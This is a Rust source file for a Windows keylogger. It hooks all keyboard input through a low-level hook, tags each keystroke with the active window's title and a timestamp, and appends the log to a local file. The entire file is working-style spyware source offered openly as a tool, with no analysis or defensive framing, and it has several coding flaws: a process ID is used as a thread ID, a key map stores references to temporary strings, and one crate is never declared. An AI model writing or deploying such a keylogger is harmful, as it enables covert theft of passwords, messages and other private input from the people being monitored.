extern crate winapi;
#[macro_use]
extern crate lazy_static;
extern crate chrono;

use chrono::Local;
use std::collections::HashMap;
use std::fs::OpenOptions;
use std::io::Write;
use std::mem;
use std::ptr;
use std::sync::mpsc::{self, Receiver, Sender};
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::{Duration, Instant};
use winapi::shared::minwindef::{DWORD, LPARAM, LRESULT, WPARAM};
use winapi::um::libloaderapi::GetModuleHandleW;
use winapi::um::processthreadsapi::GetCurrentProcessId;
use winapi::um::winuser::{
    CallNextHookEx, GetForegroundWindow, GetKeyState, GetMessageW, GetWindowTextW,
    PostThreadMessageW, SetWindowsHookExW, UnhookWindowsHookEx, HC_ACTION, KBDLLHOOKSTRUCT,
    MSG, VK_CAPITAL, VK_CONTROL, VK_LSHIFT, VK_MENU, VK_RSHIFT, VK_SHIFT, WH_KEYBOARD_LL,
    WM_KEYDOWN, WM_QUIT, WM_SYSKEYDOWN,
};

const OUTPUT_FILE: &str = "keylog.txt";
const BUFFER_FLUSH_SIZE: usize = 100; // Flush to file after this many keystrokes
const AUTOFLUSH_TIME: Duration = Duration::from_secs(30); // Auto flush after 30 seconds

#[derive(Debug)]
struct KeyEvent {
    vk_code: u32,
    time: chrono::DateTime<chrono::Local>,
    window_title: String,
    shift_pressed: bool,
    ctrl_pressed: bool,
    alt_pressed: bool,
    caps_lock: bool,
}

lazy_static! {
    static ref SENDER: Mutex<Option<Sender<KeyEvent>>> = Mutex::new(None);
    static ref KEY_MAP: HashMap<u32, (&'static str, &'static str)> = {
        let mut map = HashMap::new();
        // Normal, Shift
        map.insert(8, ("[BACKSPACE]", "[BACKSPACE]"));
        map.insert(9, ("[TAB]", "[TAB]"));
        map.insert(13, ("[ENTER]", "[ENTER]"));
        map.insert(27, ("[ESC]", "[ESC]"));
        map.insert(32, (" ", " "));
        map.insert(33, ("[PGUP]", "[PGUP]"));
        map.insert(34, ("[PGDN]", "[PGDN]"));
        map.insert(35, ("[END]", "[END]"));
        map.insert(36, ("[HOME]", "[HOME]"));
        map.insert(37, ("[LEFT]", "[LEFT]"));
        map.insert(38, ("[UP]", "[UP]"));
        map.insert(39, ("[RIGHT]", "[RIGHT]"));
        map.insert(40, ("[DOWN]", "[DOWN]"));
        map.insert(44, ("[PRTSCR]", "[PRTSCR]"));
        map.insert(45, ("[INS]", "[INS]"));
        map.insert(46, ("[DEL]", "[DEL]"));
        
        // Numbers
        map.insert(48, ("0", ")"));
        map.insert(49, ("1", "!"));
        map.insert(50, ("2", "@"));
        map.insert(51, ("3", "#"));
        map.insert(52, ("4", "$"));
        map.insert(53, ("5", "%"));
        map.insert(54, ("6", "^"));
        map.insert(55, ("7", "&"));
        map.insert(56, ("8", "*"));
        map.insert(57, ("9", "("));
        
        // Letters (will be handled separately for caps lock)
        for i in 65..=90 {
            map.insert(i, 
                       (&(char::from(i as u8 + 32) as char).to_string(), 
                        &(char::from(i as u8) as char).to_string()));
        }
        
        // Special characters
        map.insert(186, (";", ":"));
        map.insert(187, ("=", "+"));
        map.insert(188, (",", "<"));
        map.insert(189, ("-", "_"));
        map.insert(190, (".", ">"));
        map.insert(191, ("/", "?"));
        map.insert(192, ("`", "~"));
        map.insert(219, ("[", "{"));
        map.insert(220, ("\\", "|"));
        map.insert(221, ("]", "}"));
        map.insert(222, ("'", "\""));
        
        // Function keys
        for i in 1..=12 {
            map.insert(i + 111, (&format!("[F{}]", i), &format!("[F{}]", i)));
        }
        
        map
    };
}

fn get_window_title() -> String {
    unsafe {
        let hwnd = GetForegroundWindow();
        if hwnd.is_null() {
            return String::from("Unknown");
        }
        
        let mut text: [u16; 512] = [0; 512];
        let len = GetWindowTextW(hwnd, text.as_mut_ptr(), text.len() as i32);
        
        if len > 0 {
            String::from_utf16_lossy(&text[..len as usize])
        } else {
            String::from("Unknown")
        }
    }
}

unsafe extern "system" fn hook_proc(n_code: i32, w_param: WPARAM, l_param: LPARAM) -> LRESULT {
    if n_code == HC_ACTION && (w_param as DWORD == WM_KEYDOWN || w_param as DWORD == WM_SYSKEYDOWN) {
        let kb_struct = *(l_param as *const KBDLLHOOKSTRUCT);
        let vk_code = kb_struct.vkCode;
        
        // Check for modifier key state
        let shift_pressed = (GetKeyState(VK_SHIFT) < 0) || 
                            (GetKeyState(VK_LSHIFT) < 0) || 
                            (GetKeyState(VK_RSHIFT) < 0);
        let ctrl_pressed = GetKeyState(VK_CONTROL) < 0;
        let alt_pressed = GetKeyState(VK_MENU) < 0;
        let caps_lock = (GetKeyState(VK_CAPITAL) & 1) != 0;
        
        if let Some(ref sender) = *SENDER.lock().unwrap() {
            let event = KeyEvent {
                vk_code,
                time: Local::now(),
                window_title: get_window_title(),
                shift_pressed,
                ctrl_pressed,
                alt_pressed,
                caps_lock,
            };
            let _ = sender.send(event);
        }
    }
    CallNextHookEx(ptr::null_mut(), n_code, w_param, l_param)
}

fn map_key_to_char(event: &KeyEvent) -> String {
    let KeyEvent {
        vk_code,
        shift_pressed,
        caps_lock,
        ctrl_pressed,
        alt_pressed,
        ..
    } = *event;
    
    // Modifier keys
    if vk_code == VK_SHIFT as u32 {
        return "[SHIFT]".to_string();
    } else if vk_code == VK_CONTROL as u32 {
        return "[CTRL]".to_string();
    } else if vk_code == VK_MENU as u32 {
        return "[ALT]".to_string();
    }
    
    // Special key combinations
    if ctrl_pressed && alt_pressed {
        return format!("[CTRL+ALT+{:X}]", vk_code);
    } else if ctrl_pressed {
        return format!("[CTRL+{:X}]", vk_code);
    } else if alt_pressed {
        return format!("[ALT+{:X}]", vk_code);
    }
    
    // Regular keys
    if let Some(&(normal, shifted)) = KEY_MAP.get(&vk_code) {
        // For letters (ASCII 65-90), handle caps lock
        if vk_code >= 65 && vk_code <= 90 {
            let is_uppercase = (shift_pressed && !caps_lock) || (!shift_pressed && caps_lock);
            if is_uppercase {
                return shifted.to_string();
            } else {
                return normal.to_string();
            }
        }
        
        // For other characters, use shifted if shift is pressed
        if shift_pressed {
            return shifted.to_string();
        } else {
            return normal.to_string();
        }
    }
    
    // For keys not found in the map
    format!("[{:X}]", vk_code)
}

fn start_hook() -> thread::JoinHandle<()> {
    thread::spawn(move || {
        let h_instance = unsafe { GetModuleHandleW(ptr::null()) };
        let hook_id = unsafe { SetWindowsHookExW(WH_KEYBOARD_LL, Some(hook_proc), h_instance, 0) };

        if hook_id.is_null() {
            eprintln!("Failed to set keyboard hook");
            return;
        }
        
        let thread_id = unsafe { GetCurrentProcessId() };
        let mut msg: MSG = unsafe { mem::zeroed() };
        
        while unsafe { GetMessageW(&mut msg, ptr::null_mut(), 0, 0) } > 0 {
            if msg.message == WM_QUIT {
                break;
            }
        }

        unsafe {
            UnhookWindowsHookEx(hook_id);
        }
    })
}

fn shutdown_hook(thread_id: DWORD) {
    unsafe {
        PostThreadMessageW(thread_id, WM_QUIT, 0, 0);
    }
}

fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Create a channel for communication between threads
    let (tx, rx): (Sender<KeyEvent>, Receiver<KeyEvent>) = mpsc::channel();
    *SENDER.lock().unwrap() = Some(tx);
    
    // Start the keyboard hook thread
    let hook_thread = start_hook();
    
    // Buffer for storing keystrokes before writing to file
    let key_buffer = Arc::new(Mutex::new(Vec::with_capacity(BUFFER_FLUSH_SIZE)));
    let key_buffer_clone = Arc::clone(&key_buffer);
    
    // Create or open the output file
    let file = Arc::new(Mutex::new(
        OpenOptions::new()
            .append(true)
            .create(true)
            .open(OUTPUT_FILE)?
    ));
    let file_clone = Arc::clone(&file);
    
    // Initialize with a timestamp
    writeln!(
        file.lock().unwrap(),
        "--- Logging started at {} ---",
        Local::now().format("%Y-%m-%d %H:%M:%S")
    )?;
    
    // Thread to handle keystrokes and write to buffer
    let processor_thread = thread::spawn(move || {
        let mut current_window = String::new();
        let mut last_flush = Instant::now();
        
        while let Ok(event) = rx.recv() {
            let mut buffer = key_buffer.lock().unwrap();
            
            // If window changed, add a header
            if event.window_title != current_window {
                current_window = event.window_title.clone();
                buffer.push(format!(
                    "\n\n[{}] Window: {}\n",
                    event.time.format("%Y-%m-%d %H:%M:%S"),
                    current_window
                ));
            }
            
            // Map the key event to a character and add to buffer
            let key_char = map_key_to_char(&event);
            buffer.push(key_char);
            
            // Flush to file if buffer is full or if enough time has passed
            if buffer.len() >= BUFFER_FLUSH_SIZE || last_flush.elapsed() >= AUTOFLUSH_TIME {
                let contents: String = buffer.join("");
                buffer.clear();
                
                let mut file = file.lock().unwrap();
                if let Err(e) = write!(file, "{}", contents) {
                    eprintln!("Failed to write to file: {}", e);
                }
                
                last_flush = Instant::now();
            }
        }
    });
    
    // Thread to periodically flush the buffer
    let flush_thread = thread::spawn(move || {
        loop {
            thread::sleep(AUTOFLUSH_TIME);
            
            let mut buffer = key_buffer_clone.lock().unwrap();
            if !buffer.is_empty() {
                let contents: String = buffer.join("");
                buffer.clear();
                
                let mut file = file_clone.lock().unwrap();
                if let Err(e) = write!(file, "{}", contents) {
                    eprintln!("Failed to flush to file: {}", e);
                }
            }
        }
    });
    
    // Wait for Ctrl+C or other termination
    ctrlc::set_handler(move || {
        println!("Terminating keylogger...");
        // Clean shutdown
        unsafe {
            PostThreadMessageW(GetCurrentProcessId(), WM_QUIT, 0, 0);
        }
        std::process::exit(0);
    })?;
    
    // Keep the main thread alive
    hook_thread.join().unwrap();
    processor_thread.join().unwrap();
    flush_thread.join().unwrap();
    
    Ok(())
}
